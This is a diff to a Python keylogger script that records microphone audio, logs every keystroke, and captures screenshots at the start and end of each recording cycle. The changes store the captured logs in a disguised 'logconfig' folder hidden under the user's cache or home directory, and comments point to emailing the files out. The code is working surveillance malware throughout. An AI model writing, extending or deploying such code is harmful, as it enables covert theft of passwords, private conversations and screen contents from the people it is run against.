@@ -29,17 +29,38 @@ from PIL import ImageGrab
 
 from datetime import datetime
 
+# OS information fetch
+
+current_OS = platform.system()
+current_user = os.getlogin()
+logpath = ""
+
+# Directory creation for log files. MacOS currently not supported
+
+directory_name = "logconfig"
+
+if(current_OS == 'Linux'):
+    logpath = "/home/" + current_user + "/.cache/" + directory_name + "/"
+elif(current_OS == 'Windows'):
+    logpath = "C:\\Users\\" + current_user + "\\" + directory_name + "\\"
+    
+if not os.path.exists(logpath):
+    os.makedirs(logpath)
+
 # Variables
 
 system_information = "system.txt"
 audio_information = "audio.wav"
 clipboard_information = "clipboard.txt"
-screenshot_information = "screenshot.png"
+screenshot_information_beg = "screenshot_beg.png"
+screenshot_information_end = "screenshot_end.png"
 keys_information = "key_log.txt"
 
-system_information_enc = 'enc_system.txt'
-clipboard_information_enc = 'enc_clipboard.txt'
-keys_information_enc = 'enc_keys_logged.txt'
+# Encrypted files
+
+# system_information_enc = 'enc_system.txt'
+# clipboard_information_enc = 'enc_clipboard.txt'
+# keys_information_enc = 'enc_keys_logged.txt'
 
 # Email - https://medium.com/@abdullahzulfiqar653/sending-emails-with-attachments-using-python-32b908909d73
 
@@ -83,12 +104,6 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 # f.close()
 
-# Screenshotting
-
-# screenshot = ImageGrab.grab()
-# screenshot.save("screenshot.png")
-# screenshot.close()
-
 # Timer
 
 #current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()
@@ -96,12 +111,10 @@ keys_information_enc = 'enc_keys_logged.txt'
 no_of_iterations = 1
 current_iteration = 0
 iteration_duration = 15
+stopping_time = 0
+file_prefix = str(datetime.now())[0:19] + ' - ' + str(current_iteration)
 
-while current_iteration < no_of_iterations:
-    
-    #Microphone & Keyboard Logging
-
-    def on_press_func(key):
+def on_press_func(key):
         try:
             if time.time() > stopping_time:
                 listener.stop()
@@ -110,24 +123,35 @@ while current_iteration < no_of_iterations:
         except AttributeError:
             f.write('(' + str(key) + ')')
 
+def take_screenshot(file_name):
+    screenshot = ImageGrab.grab()
+    screenshot.save(logpath + file_prefix + file_name)
+    screenshot.close()
+
+
+while current_iteration < no_of_iterations:
+
     sampling_freq = 44100
     duration = iteration_duration
 
     myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
 
-    f = open(keys_information, 'a')
+    take_screenshot(screenshot_information_beg)
+
+    f = open(logpath + file_prefix + keys_information, 'a')
 
     stopping_time = time.time() + iteration_duration
-
+    
     with Listener(
             on_press=on_press_func) as listener:
         listener.join()
 
     f.close()
-
     sd.wait()
 
-    write(audio_information, sampling_freq, myrecording)
+    write(logpath + file_prefix + audio_information, sampling_freq, myrecording)
+
+    take_screenshot(screenshot_information_end)
 
     current_iteration += 1
 
